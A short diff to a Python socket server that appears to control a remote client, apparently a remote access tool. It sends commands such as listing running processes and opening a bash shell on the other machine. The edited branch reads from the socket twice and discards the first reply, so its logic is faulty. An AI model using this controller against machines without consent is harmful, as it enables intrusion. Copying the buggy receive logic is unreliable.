@@ -79,8 +79,11 @@ class Server():
             # Get All Running Process
             elif choice==7:
                 self.c.send("get_running_process".encode())
-                print("Process Name\t\tPID")
-                print(self.c.recv(99999).decode())
+                if "PID" in self.c.recv(99999).decode():
+                    print(self.c.recv(99999).decode())
+                else:
+                    print("Process Name\t\tPID")
+                    print(self.c.recv(99999).decode())
             # Open Bash
             elif choice==8:
                 self.c.send("open_bash".encode())
